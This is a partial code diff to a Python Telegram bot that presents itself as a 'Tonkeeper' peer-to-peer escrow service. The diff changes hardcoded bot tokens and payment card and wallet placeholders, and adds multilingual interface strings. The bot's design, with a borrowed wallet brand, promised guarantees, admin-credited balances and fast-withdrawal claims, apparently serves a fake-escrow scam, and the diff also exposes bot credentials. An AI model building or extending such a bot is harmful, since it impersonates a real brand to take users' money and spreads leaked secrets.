@@ -11,11 +11,11 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.client.default import DefaultBotProperties
 
 # ========== КОНФИГ ==========
-BOT_TOKEN = "8854837097:AAGWRVj4xW3WVh8xIk1iB50QuClmhA_dxCg"
+BOT_TOKEN = "8734046996:AAFg1-HE0aG1pe9rz-Jjz3hx5ZQpmppqS2U"
 MASTER_ADMIN_ID = 8002472821
 SUPPORT_LINK = "@p2psuptokeeperbot"
-BOT_USERNAME = "tonkeeperdialbot"
-BOT_NAME = "Tonkeeper | P2P"
+BOT_USERNAME = "dealstonkeeperbot"
+BOT_NAME = " Tonkeeper | P2P"
 CHANNEL_LINK = "https://t.me/tonkeeper_ru"
 
 # ========== ПОДДЕРЖИВАЕМЫЕ ЯЗЫКИ ==========
@@ -195,10 +195,10 @@ def load_rekvisits():
         with open(REKVISITS_FILE, 'r', encoding='utf-8') as f:
             return json.load(f)
     return {
-        "ton": f"{pm('💎')} ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {{amount}} TON",
-        "stars": f"{pm('⭐️')} ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @{BOT_USERNAME}\n\nСумма: {{amount}} STARS",
-        "rub": f"{pm('💰')} ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {{amount}} RUB",
-        "uah": f"{pm('🌐')} ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {{amount}} UAH"
+        "ton": "💎 ОПЛАТА TON\n\nПереведите TON на кошелек:\nUQCD3wX5Y5G5d8F5J8K9L0Z1X2C3V4B5N6M7A8S9D0F1G2H3\n\nСумма: {amount} TON",
+        "stars": "⭐️ ОПЛАТА ЗВЁЗДАМИ\n\nОтправьте звёзды в бота: @{BOT_USERNAME}\n\nСумма: {amount} STARS",
+        "rub": "💰 ОПЛАТА РУБЛЯМИ\n\nПереведите на карту:\n2200 1234 5678 9012\nТинькофф\n\nСумма: {amount} RUB",
+        "uah": "🌐 ОПЛАТА ГРИВНАМИ\n\nПереведите на карту:\n4149 5678 1234 5678\nПриватБанк\n\nСумма: {amount} UAH"
     }
 
 
@@ -252,11 +252,11 @@ withdraw_requests = load_withdraw_requests()
 user_language = load_user_language()
 
 
-# ========== ЛОКАЛИЗАЦИЯ ==========
+# ========== ЛОКАЛИЗАЦИЯ ВСЕХ СООБЩЕНИЙ ==========
 LOCALE = {
     "ru": {
-        "bot_name": "Tonkeeper | P2P",
-        "safe_deals": "БЕЗОПАСНЫЕ P2P-СДЕЛКИ",
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
         "feature1": "Честные сделки между продавцами и покупателями",
         "feature2": "TON | STARS | RUB | UAH",
         "feature3": "Гарант безопасности с обеих сторон",
@@ -271,6 +271,7 @@ LOCALE = {
         "step7": "Деньги зачисляются на баланс продавца",
         "our_channel": "НАШ КАНАЛ",
         "support": "ПОДДЕРЖКА",
+        "support_contact": "@p2psuptokeeperbot",
         "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
         "create_deal": "СОЗДАТЬ СДЕЛКУ",
         "my_balance": "МОЙ БАЛАНС",
@@ -283,8 +284,8 @@ LOCALE = {
         "describe_product": "ОПИШИТЕ ТОВАР ИЛИ УСЛУГУ, КОТОРУЮ ВЫ ПРОДАЁТЕ",
         "example_product": "ПРИМЕР: NFT-подарок Telegram Premium",
         "choose_currency": "ВЫБЕРИТЕ ВАЛЮТУ СДЕЛКИ",
-        "enter_amount": "ВВЕДИТЕ СУММУ СДЕЛКИ (ТОЛЬКО ЧИСЛО)",
-        "enter_buyer": "ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ (БЕЗ @)",
+        "enter_amount": "ВВЕДИТЕ СУММУ СДЕЛКИ",
+        "enter_buyer": "ВВЕДИТЕ TELEGRAM USERNAME ПОКУПАТЕЛЯ",
         "buyer_username_example": "ПРИМЕР: john_doe",
         "only_this_user": "ТОЛЬКО ЭТОТ ПОЛЬЗОВАТЕЛЬ СМОЖЕТ ЗАЙТИ В СДЕЛКУ",
         "deal_created": "СДЕЛКА СОЗДАНА",
@@ -300,7 +301,7 @@ LOCALE = {
         "premium_2": "СНИЖЕННАЯ КОМИССИЯ (0%)",
         "premium_3": "РАННИЙ ДОСТУП К НОВЫМ ФУНКЦИЯМ",
         "premium_4": "ЭКСКЛЮЗИВНЫЕ NFT-НАГРАДЫ",
-        "premium_active": "ВАШ СТАТУС: АКТИВЕН (БЕССРОЧНО)",
+        "premium_active": "ВАШ СТАТУС: АКТИВЕН",
         "faq_q1": "КАК НАЧАТЬ СДЕЛКУ?",
         "faq_a1": "НАЖМИТЕ «СОЗДАТЬ СДЕЛКУ» И СЛЕДУЙТЕ ИНСТРУКЦИИ.",
         "faq_q2": "КАКИЕ ВАЛЮТЫ ДОСТУПНЫ?",
@@ -314,7 +315,7 @@ LOCALE = {
         "faq_q6": "СКОЛЬКО ВРЕМЕНИ ЗАНИМАЕТ ВЫВОД?",
         "faq_a6": "1-5 МИНУТ ПОСЛЕ ПОДТВЕРЖДЕНИЯ.",
         "faq_q7": "КАК СВЯЗАТЬСЯ С ПОДДЕРЖКОЙ?",
-        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ",
+        "faq_a7": "НАЖМИТЕ КНОПКУ «КАНАЛ» ИЛИ ПИШИТЕ В ПОДДЕРЖКУ @p2psuptokeeperbot",
         "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА ИЛИ УЖЕ ЗАВЕРШЕНА",
         "access_denied": "ДОСТУП ЗАПРЕЩЁН",
         "invalid_amount": "ВВЕДИТЕ ПОЛОЖИТЕЛЬНОЕ ЧИСЛО",
@@ -326,17 +327,73 @@ LOCALE = {
         "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
         "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
         "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
-        "waiting_for_payment": "ОЖИДАНИЕ ОПЛАТЫ",
-        "paid": "ОПЛАЧЕНО",
-        "awaiting_confirmation": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
-        "completed": "ЗАВЕРШЕНО",
-        "select_language": "ВЫБЕРИТЕ ЯЗЫК",
-        "welcome": "ДОБРО ПОЖАЛОВАТЬ!",
-        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
+        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
+        "status_paid": "ОПЛАЧЕНО",
+        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
+        "status_completed": "ЗАВЕРШЕНО",
+        "select_language": "ВЫБРАТЬ ЯЗЫК",
+        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
+        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК ДЛЯ ПРОДОЛЖЕНИЯ:",
+        "product": "ТОВАР",
+        "amount": "СУММА",
+        "seller": "ПРОДАВЕЦ",
+        "buyer": "ПОКУПАТЕЛЬ",
+        "deal": "СДЕЛКА",
+        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
+        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
+        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
+        "contact_support": "В ПОДДЕРЖКУ",
+        "balance_topped_up": "ВАШ БАЛАНС ПОПОЛНЕН",
+        "withdraw_request_created": "ЗАЯВКА НА ВЫВОД СОЗДАНА",
+        "withdraw_pending": "ОЖИДАЙТЕ ВЫВОДА 1-5 МИНУТ",
+        "withdraw_completed": "ВЫВОД ПОДТВЕРЖДЁН",
+        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
+        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
+        "cmd_usage": "ИСПОЛЬЗОВАНИЕ",
+        "request_not_found": "ЗАЯВКА НЕ НАЙДЕНА",
+        "request_already_processed": "ЗАЯВКА УЖЕ ОБРАБОТАНА",
+        "photo_updated": "ФОТО ОБНОВЛЕНО",
+        "send_photo": "ОТПРАВЬТЕ ФОТО",
+        "user_not_found": "ПОЛЬЗОВАТЕЛЬ НЕ НАЙДЕН",
+        "balance_added": "БАЛАНС НАЧИСЛЕН",
+        "rekvisits_updated": "РЕКВИЗИТЫ ОБНОВЛЕНЫ",
+        "admin_added": "АДМИН ДОБАВЛЕН",
+        "admin_removed": "АДМИН УДАЛЁН",
+        "cannot_remove_master": "НЕЛЬЗЯ УДАЛИТЬ ГЛАВНОГО АДМИНА",
+        "admin_list": "СПИСОК АДМИНОВ",
+        "no_deals_total": "НЕТ СДЕЛОК",
+        "all_deals_title": "ВСЕ СДЕЛКИ",
+        "payment_details": "РЕКВИЗИТЫ ОПЛАТЫ",
+        "edit_rekvisits_title": "РЕДАКТИРОВАНИЕ РЕКВИЗИТОВ",
+        "enter_new_text": "ВВЕДИТЕ НОВЫЙ ТЕКСТ",
+        "use_amount_placeholder": "ИСПОЛЬЗУЙТЕ {amount} ДЛЯ ПОДСТАНОВКИ СУММЫ",
+        "enter_user_id": "ВВЕДИТЕ TELEGRAM ID ПОЛЬЗОВАТЕЛЯ",
+        "enter_withdraw_details": "ВВЕДИТЕ РЕКВИЗИТЫ ДЛЯ ВЫВОДА",
+        "enter_withdraw_username": "ВВЕДИТЕ ВАШ TELEGRAM USERNAME",
+        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
+        "copy_link": "СКОПИРУЙТЕ ССЫЛКУ",
+        "after_payment_notify": "ПОСЛЕ ОПЛАТЫ ВЫ ПОЛУЧИТЕ УВЕДОМЛЕНИЕ",
+        "payment_verified": "ОПЛАТА ПРОВЕРЕНА",
+        "funds_deducted": "СРЕДСТВА СПИСАНЫ",
+        "product_delivered": "ТОВАР ПЕРЕДАН",
+        "deal_completed_msg": "СПАСИБО ЗА ДОВЕРИЕ",
+        "funds_added_to_balance": "СРЕДСТВА ЗАЧИСЛЕНЫ НА БАЛАНС",
+        "for_user": "ДЛЯ",
+        "need": "НУЖНО",
+        "available": "ДОСТУПНО",
+        "currency": "ВАЛЮТА",
+        "created": "СОЗДАНА",
+        "status": "СТАТУС",
+        "check_status": "ПРОВЕРИТЬ СТАТУС",
+        "example": "ПРИМЕР",
+        "subscribe": "ПОДПИСЫВАЙТЕСЬ",
+        "channel_content": "В КАНАЛЕ:\n• НОВОСТИ И ОБНОВЛЕНИЯ\n• ПОЛЕЗНЫЕ ГАЙДЫ\n• РОЗЫГРЫШИ И БОНУСЫ\n• АКТУАЛЬНЫЕ КУРСЫ ВАЛЮТ",
+        "click_subscribe": "ЖМИ НА ССЫЛКУ И ПОДПИСЫВАЙСЯ",
+        "thank_you": "СПАСИБО, ЧТО ВЫ С НАМИ"
     },
     "en": {
-        "bot_name": "Tonkeeper | P2P",
-        "safe_deals": "SECURE P2P DEALS",
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "SECURE DEALS",
         "feature1": "Fair deals between sellers and buyers",
         "feature2": "TON | STARS | RUB | UAH",
         "feature3": "Security guarantee from both sides",
@@ -351,6 +408,7 @@ LOCALE = {
         "step7": "Money credited to seller's balance",
         "our_channel": "OUR CHANNEL",
         "support": "SUPPORT",
+        "support_contact": "@p2psuptokeeperbot",
         "start_now": "START NOW",
         "create_deal": "CREATE DEAL",
         "my_balance": "MY BALANCE",
@@ -363,8 +421,8 @@ LOCALE = {
         "describe_product": "DESCRIBE THE PRODUCT OR SERVICE YOU ARE SELLING",
         "example_product": "EXAMPLE: NFT gift Telegram Premium",
         "choose_currency": "CHOOSE DEAL CURRENCY",
-        "enter_amount": "ENTER DEAL AMOUNT (NUMBER ONLY)",
-        "enter_buyer": "ENTER BUYER'S TELEGRAM USERNAME (WITHOUT @)",
+        "enter_amount": "ENTER DEAL AMOUNT",
+        "enter_buyer": "ENTER BUYER'S TELEGRAM USERNAME",
         "buyer_username_example": "EXAMPLE: john_doe",
         "only_this_user": "ONLY THIS USER CAN ACCESS THE DEAL",
         "deal_created": "DEAL CREATED",
@@ -380,7 +438,7 @@ LOCALE = {
         "premium_2": "REDUCED COMMISSION (0%)",
         "premium_3": "EARLY ACCESS TO NEW FEATURES",
         "premium_4": "EXCLUSIVE NFT REWARDS",
-        "premium_active": "YOUR STATUS: ACTIVE (LIFETIME)",
+        "premium_active": "YOUR STATUS: ACTIVE",
         "faq_q1": "HOW TO START A DEAL?",
         "faq_a1": "CLICK 'CREATE DEAL' AND FOLLOW THE INSTRUCTIONS.",
         "faq_q2": "WHAT CURRENCIES ARE AVAILABLE?",
@@ -394,7 +452,7 @@ LOCALE = {
         "faq_q6": "HOW LONG DOES WITHDRAWAL TAKE?",
         "faq_a6": "1-5 MINUTES AFTER CONFIRMATION.",
         "faq_q7": "HOW TO CONTACT SUPPORT?",
-        "faq_a7": "CLICK 'CHANNEL' BUTTON OR MESSAGE SUPPORT",
+        "faq_a7": "CLICK 'CHANNEL' BUTTON OR MESSAGE SUPPORT @p2psuptokeeperbot",
         "deal_not_found": "DEAL NOT FOUND OR ALREADY COMPLETED",
         "access_denied": "ACCESS DENIED",
         "invalid_amount": "ENTER A POSITIVE NUMBER",
@@ -406,17 +464,73 @@ LOCALE = {
         "choose_payment_method": "CHOOSE PAYMENT METHOD",
         "pay_by_rekvisits": "PAY BY DETAILS",
         "pay_by_balance": "PAY FROM BALANCE",
-        "waiting_for_payment": "WAITING FOR PAYMENT",
-        "paid": "PAID",
-        "awaiting_confirmation": "AWAITING CONFIRMATION",
-        "completed": "COMPLETED",
+        "status_waiting": "WAITING FOR PAYMENT",
+        "status_paid": "PAID",
+        "status_awaiting": "AWAITING CONFIRMATION",
+        "status_completed": "COMPLETED",
         "select_language": "SELECT LANGUAGE",
-        "welcome": "WELCOME!",
-        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
+        "welcome": "WELCOME",
+        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nSELECT YOUR LANGUAGE TO CONTINUE:",
+        "product": "PRODUCT",
+        "amount": "AMOUNT",
+        "seller": "SELLER",
+        "buyer": "BUYER",
+        "deal": "DEAL",
+        "waiting_for_delivery": "WAITING FOR DELIVERY",
+        "seller_delivered": "SELLER DELIVERED PRODUCT",
+        "confirm_receipt": "CONFIRM RECEIPT",
+        "contact_support": "CONTACT SUPPORT",
+        "balance_topped_up": "YOUR BALANCE HAS BEEN TOPPED UP",
+        "withdraw_request_created": "WITHDRAWAL REQUEST CREATED",
+        "withdraw_pending": "PLEASE WAIT 1-5 MINUTES",
+        "withdraw_completed": "WITHDRAWAL CONFIRMED",
+        "no_active_requests": "NO ACTIVE REQUESTS",
+        "admin_rights": "INSUFFICIENT RIGHTS",
+        "cmd_usage": "USAGE",
+        "request_not_found": "REQUEST NOT FOUND",
+        "request_already_processed": "REQUEST ALREADY PROCESSED",
+        "photo_updated": "PHOTO UPDATED",
+        "send_photo": "SEND A PHOTO",
+        "user_not_found": "USER NOT FOUND",
+        "balance_added": "BALANCE ADDED",
+        "rekvisits_updated": "PAYMENT DETAILS UPDATED",
+        "admin_added": "ADMIN ADDED",
+        "admin_removed": "ADMIN REMOVED",
+        "cannot_remove_master": "CANNOT REMOVE MASTER ADMIN",
+        "admin_list": "ADMIN LIST",
+        "no_deals_total": "NO DEALS",
+        "all_deals_title": "ALL DEALS",
+        "payment_details": "PAYMENT DETAILS",
+        "edit_rekvisits_title": "EDIT PAYMENT DETAILS",
+        "enter_new_text": "ENTER NEW TEXT",
+        "use_amount_placeholder": "USE {amount} FOR AMOUNT PLACEHOLDER",
+        "enter_user_id": "ENTER USER TELEGRAM ID",
+        "enter_withdraw_details": "ENTER WITHDRAWAL DETAILS",
+        "enter_withdraw_username": "ENTER YOUR TELEGRAM USERNAME",
+        "deal_link_text": "LINK FOR BUYER",
+        "copy_link": "COPY THE LINK",
+        "after_payment_notify": "YOU WILL RECEIVE NOTIFICATION AFTER PAYMENT",
+        "payment_verified": "PAYMENT VERIFIED",
+        "funds_deducted": "FUNDS DEDUCTED",
+        "product_delivered": "PRODUCT DELIVERED",
+        "deal_completed_msg": "THANK YOU FOR YOUR TRUST",
+        "funds_added_to_balance": "FUNDS ADDED TO BALANCE",
+        "for_user": "FOR",
+        "need": "NEEDED",
+        "available": "AVAILABLE",
+        "currency": "CURRENCY",
+        "created": "CREATED",
+        "status": "STATUS",
+        "check_status": "CHECK STATUS",
+        "example": "EXAMPLE",
+        "subscribe": "SUBSCRIBE",
+        "channel_content": "IN THE CHANNEL:\n• NEWS AND UPDATES\n• USEFUL GUIDES\n• GIVEAWAYS AND BONUSES\n• CURRENT EXCHANGE RATES",
+        "click_subscribe": "CLICK THE LINK AND SUBSCRIBE",
+        "thank_you": "THANK YOU FOR BEING WITH US"
     },
     "zh": {
-        "bot_name": "Tonkeeper | P2P",
-        "safe_deals": "安全P2P交易",
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "安全交易",
         "feature1": "买卖双方公平交易",
         "feature2": "TON | STARS | RUB | UAH",
         "feature3": "双方安全保障",
@@ -431,6 +545,7 @@ LOCALE = {
         "step7": "款项计入卖家余额",
         "our_channel": "我们的频道",
         "support": "支持",
+        "support_contact": "@p2psuptokeeperbot",
         "start_now": "立即开始",
         "create_deal": "创建交易",
         "my_balance": "我的余额",
@@ -443,8 +558,8 @@ LOCALE = {
         "describe_product": "描述您出售的商品或服务",
         "example_product": "示例：NFT礼物 Telegram Premium",
         "choose_currency": "选择交易货币",
-        "enter_amount": "输入交易金额（仅数字）",
-        "enter_buyer": "输入买家的Telegram用户名（不带@）",
+        "enter_amount": "输入交易金额",
+        "enter_buyer": "输入买家的Telegram用户名",
         "buyer_username_example": "示例：john_doe",
         "only_this_user": "只有此用户可以访问交易",
         "deal_created": "交易已创建",
@@ -460,7 +575,7 @@ LOCALE = {
         "premium_2": "降低手续费 (0%)",
         "premium_3": "新功能抢先体验",
         "premium_4": "独家NFT奖励",
-        "premium_active": "您的状态：激活（永久）",
+        "premium_active": "您的状态：激活",
         "faq_q1": "如何开始交易？",
         "faq_a1": "点击「创建交易」并按照说明操作。",
         "faq_q2": "支持哪些货币？",
@@ -474,7 +589,7 @@ LOCALE = {
         "faq_q6": "提现需要多长时间？",
         "faq_a6": "确认后1-5分钟。",
         "faq_q7": "如何联系支持？",
-        "faq_a7": "点击「频道」按钮或联系客服",
+        "faq_a7": "点击「频道」按钮或联系客服 @p2psuptokeeperbot",
         "deal_not_found": "交易未找到或已完成",
         "access_denied": "访问被拒绝",
         "invalid_amount": "输入正数",
@@ -486,17 +601,73 @@ LOCALE = {
         "choose_payment_method": "选择支付方式",
         "pay_by_rekvisits": "按信息付款",
         "pay_by_balance": "从余额付款",
-        "waiting_for_payment": "等待付款",
-        "paid": "已付款",
-        "awaiting_confirmation": "等待确认",
-        "completed": "已完成",
+        "status_waiting": "等待付款",
+        "status_paid": "已付款",
+        "status_awaiting": "等待确认",
+        "status_completed": "已完成",
         "select_language": "选择语言",
-        "welcome": "欢迎！",
-        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
+        "welcome": "欢迎",
+        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\n选择您的语言以继续:",
+        "product": "商品",
+        "amount": "金额",
+        "seller": "卖家",
+        "buyer": "买家",
+        "deal": "交易",
+        "waiting_for_delivery": "等待交付",
+        "seller_delivered": "卖家已交付商品",
+        "confirm_receipt": "确认收到",
+        "contact_support": "联系客服",
+        "balance_topped_up": "您的余额已充值",
+        "withdraw_request_created": "提现申请已创建",
+        "withdraw_pending": "请等待1-5分钟",
+        "withdraw_completed": "提现已确认",
+        "no_active_requests": "无活跃申请",
+        "admin_rights": "权限不足",
+        "cmd_usage": "使用方法",
+        "request_not_found": "申请未找到",
+        "request_already_processed": "申请已处理",
+        "photo_updated": "照片已更新",
+        "send_photo": "发送照片",
+        "user_not_found": "用户未找到",
+        "balance_added": "余额已添加",
+        "rekvisits_updated": "支付信息已更新",
+        "admin_added": "管理员已添加",
+        "admin_removed": "管理员已移除",
+        "cannot_remove_master": "无法移除主管理员",
+        "admin_list": "管理员列表",
+        "no_deals_total": "无交易",
+        "all_deals_title": "所有交易",
+        "payment_details": "支付信息",
+        "edit_rekvisits_title": "编辑支付信息",
+        "enter_new_text": "输入新文本",
+        "use_amount_placeholder": "使用 {amount} 作为金额占位符",
+        "enter_user_id": "输入用户Telegram ID",
+        "enter_withdraw_details": "输入提现信息",
+        "enter_withdraw_username": "输入您的Telegram用户名",
+        "deal_link_text": "买家链接",
+        "copy_link": "复制链接",
+        "after_payment_notify": "付款后您将收到通知",
+        "payment_verified": "付款已验证",
+        "funds_deducted": "资金已扣除",
+        "product_delivered": "商品已交付",
+        "deal_completed_msg": "感谢您的信任",
+        "funds_added_to_balance": "资金已添加到余额",
+        "for_user": "给",
+        "need": "需要",
+        "available": "可用",
+        "currency": "货币",
+        "created": "创建于",
+        "status": "状态",
+        "check_status": "检查状态",
+        "example": "示例",
+        "subscribe": "订阅",
+        "channel_content": "频道内容：\n• 新闻和更新\n• 实用指南\n• 赠品和奖金\n• 最新汇率",
+        "click_subscribe": "点击链接并订阅",
+        "thank_you": "感谢您的支持"
     },
     "ar": {
-        "bot_name": "Tonkeeper | P2P",
-        "safe_deals": "صفقات P2P آمنة",
+        "bot_name": "Deals Tonkeeper",
+        "bot_desc": "صفقات آمنة",
         "feature1": "صفقات عادلة بين البائعين والمشترين",
         "feature2": "TON | STARS | RUB | UAH",
         "feature3": "ضمان الأمن من كلا الجانبين",
@@ -511,6 +682,7 @@ LOCALE = {
         "step7": "تضاف الأموال إلى رصيد البائع",
         "our_channel": "قناتنا",
         "support": "الدعم",
+        "support_contact": "@p2psuptokeeperbot",
         "start_now": "ابدأ الآن",
         "create_deal": "إنشاء صفقة",
         "my_balance": "رصيدي",
@@ -523,8 +695,8 @@ LOCALE = {
         "describe_product": "وصف المنتج أو الخدمة التي تبيعها",
         "example_product": "مثال: هدية NFT Telegram Premium",
         "choose_currency": "اختر عملة الصفقة",
-        "enter_amount": "أدخل مبلغ الصفقة (أرقام فقط)",
-        "enter_buyer": "أدخل اسم مستخدم المشتري في تليغرام (بدون @)",
+        "enter_amount": "أدخل مبلغ الصفقة",
+        "enter_buyer": "أدخل اسم مستخدم المشتري في تليغرام",
         "buyer_username_example": "مثال: john_doe",
         "only_this_user": "هذا المستخدم فقط يمكنه الوصول إلى الصفقة",
         "deal_created": "تم إنشاء الصفقة",
@@ -540,7 +712,7 @@ LOCALE = {
         "premium_2": "عمولة مخفضة (0%)",
         "premium_3": "وصول مبكر إلى الميزات الجديدة",
         "premium_4": "مكافآت NFT حصرية",
-        "premium_active": "حالتك: نشط (مدى الحياة)",
+        "premium_active": "حالتك: نشط",
         "faq_q1": "كيف أبدأ صفقة؟",
         "faq_a1": "اضغط «إنشاء صفقة» واتبع التعليمات.",
         "faq_q2": "ما هي العملات المتاحة؟",
@@ -554,7 +726,7 @@ LOCALE = {
         "faq_q6": "كم يستغرق السحب؟",
         "faq_a6": "1-5 دقائق بعد التأكيد.",
         "faq_q7": "كيف اتصل بالدعم؟",
-        "faq_a7": "اضغط زر «القناة» أو أرسل رسالة للدعم",
+        "faq_a7": "اضغط زر «القناة» أو أرسل رسالة للدعم @p2psuptokeeperbot",
         "deal_not_found": "الصفقة غير موجودة أو مكتملة بالفعل",
         "access_denied": "الوصول مرفوض",
         "invalid_amount": "أدخل رقماً موجباً",
@@ -566,13 +738,69 @@ LOCALE = {
         "choose_payment_method": "اختر طريقة الدفع",
         "pay_by_rekvisits": "الدفع حسب التفاصيل",
         "pay_by_balance": "الدفع من الرصيد",
-        "waiting_for_payment": "انتظار الدفع",
-        "paid": "تم الدفع",
-        "awaiting_confirmation": "انتظار التأكيد",
-        "completed": "مكتملة",
+        "status_waiting": "انتظار الدفع",
+        "status_paid": "تم الدفع",
+        "status_awaiting": "انتظار التأكيد",
+        "status_completed": "مكتملة",
         "select_language": "اختر اللغة",
-        "welcome": "مرحباً!",
-        "choose_language_prompt": "🇷🇺🇬🇧🇨🇳🇸🇦\n\nВЫБЕРИТЕ ЯЗЫК, ЧТОБЫ ПРОДОЛЖИТЬ:\n\nSELECT YOUR LANGUAGE TO CONTINUE:\n\n选择您的语言以继续:\n\nاختر لغتك للمتابعة:"
+        "welcome": "مرحباً",
+        "choose_language_prompt": "🇷🇺 🇬🇧 🇨🇳 🇸🇦\n\nاختر لغتك للمتابعة:",
+        "product": "المنتج",
+        "amount": "المبلغ",
+        "seller": "البائع",
+        "buyer": "المشتري",
+        "deal": "الصفقة",
+        "waiting_for_delivery": "انتظار التسليم",
+        "seller_delivered": "البائع سلم المنتج",
+        "confirm_receipt": "تأكيد الاستلام",
+        "contact_support": "اتصل بالدعم",
+        "balance_topped_up": "تم شحن رصيدك",
+        "withdraw_request_created": "تم إنشاء طلب السحب",
+        "withdraw_pending": "يرجى الانتظار 1-5 دقائق",
+        "withdraw_completed": "تم تأكيد السحب",
+        "no_active_requests": "لا توجد طلبات نشطة",
+        "admin_rights": "صلاحيات غير كافية",
+        "cmd_usage": "الاستخدام",
+        "request_not_found": "الطلب غير موجود",
+        "request_already_processed": "الطلب تمت معالجته بالفعل",
+        "photo_updated": "تم تحديث الصورة",
+        "send_photo": "أرسل صورة",
+        "user_not_found": "المستخدم غير موجود",
+        "balance_added": "تم إضافة الرصيد",
+        "rekvisits_updated": "تم تحديث تفاصيل الدفع",
+        "admin_added": "تم إضافة المدقق",
+        "admin_removed": "تم إزالة المدقق",
+        "cannot_remove_master": "لا يمكن إزالة المدقق الرئيسي",
+        "admin_list": "قائمة المدققين",
+        "no_deals_total": "لا توجد صفقات",
+        "all_deals_title": "جميع الصفقات",
+        "payment_details": "تفاصيل الدفع",
+        "edit_rekvisits_title": "تحرير تفاصيل الدفع",
+        "enter_new_text": "أدخل نصاً جديداً",
+        "use_amount_placeholder": "استخدم {amount} كعنصر نائب للمبلغ",
+        "enter_user_id": "أدخل معرف المستخدم في تليغرام",
+        "enter_withdraw_details": "أدخل تفاصيل السحب",
+        "enter_withdraw_username": "أدخل اسم المستخدم الخاص بك في تليغرام",
+        "deal_link_text": "رابط المشتري",
+        "copy_link": "انسخ الرابط",
+        "after_payment_notify": "ستتلقى إشعاراً بعد الدفع",
+        "payment_verified": "تم التحقق من الدفع",
+        "funds_deducted": "تم خصم الأموال",
+        "product_delivered": "تم تسليم المنتج",
+        "deal_completed_msg": "شكراً لثقتك",
+        "funds_added_to_balance": "تم إضافة الأموال إلى الرصيد",
+        "for_user": "لـ",
+        "need": "مطلوب",
+        "available": "متاح",
+        "currency": "العملة",
+        "created": "تم الإنشاء",
+        "status": "الحالة",
+        "check_status": "تحقق من الحالة",
+        "example": "مثال",
+        "subscribe": "اشترك",
+        "channel_content": "في القناة:\n• أخبار وتحديثات\n• أدلة مفيدة\n• هدايا ومكافآت\n• أسعار الصرف الحالية",
+        "click_subscribe": "انقر على الرابط واشترك",
+        "thank_you": "شكراً لوجودكم معنا"
     }
 }
 
@@ -587,7 +815,7 @@ def get_user_language(user_id: int) -> str:
     uid = str(user_id)
     if uid in user_language:
         return user_language[uid]
-    return None  # Возвращаем None, если язык не выбран
+    return None
 
 
 def set_user_language(user_id: int, lang: str):
@@ -686,45 +914,57 @@ def admin_panel_keyboard(user_id: int):
     if lang is None:
         lang = "ru"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [premium_button("СМЕНИТЬ СТАРТ ФОТО", "change_photo", "📷")],
-        [premium_button("НАЧИСЛИТЬ БАЛАНС", "admin_add_balance", "💰")],
-        [premium_button("ДОБАВИТЬ АДМИНА", "add_admin", "🐶")],
-        [premium_button("УДАЛИТЬ АДМИНА", "remove_admin", "🐱")],
-        [premium_button("СПИСОК АДМИНОВ", "list_admins", "📊")],
-        [premium_button("РЕКВИЗИТЫ ОПЛАТЫ", "edit_rekvisits", "💎")],
-        [premium_button("ВСЕ СДЕЛКИ", "all_deals", "🏆")],
-        [premium_button("ЗАЯВКИ НА ВЫВОД", "withdraw_requests", "💲")],
+        [premium_button(get_text(lang, "photo_updated"), "change_photo", "📷")],
+        [premium_button(get_text(lang, "balance_added"), "admin_add_balance", "💰")],
+        [premium_button(get_text(lang, "admin_added"), "add_admin", "🐶")],
+        [premium_button(get_text(lang, "admin_removed"), "remove_admin", "🐱")],
+        [premium_button(get_text(lang, "admin_list"), "list_admins", "📊")],
+        [premium_button(get_text(lang, "edit_rekvisits_title"), "edit_rekvisits", "💎")],
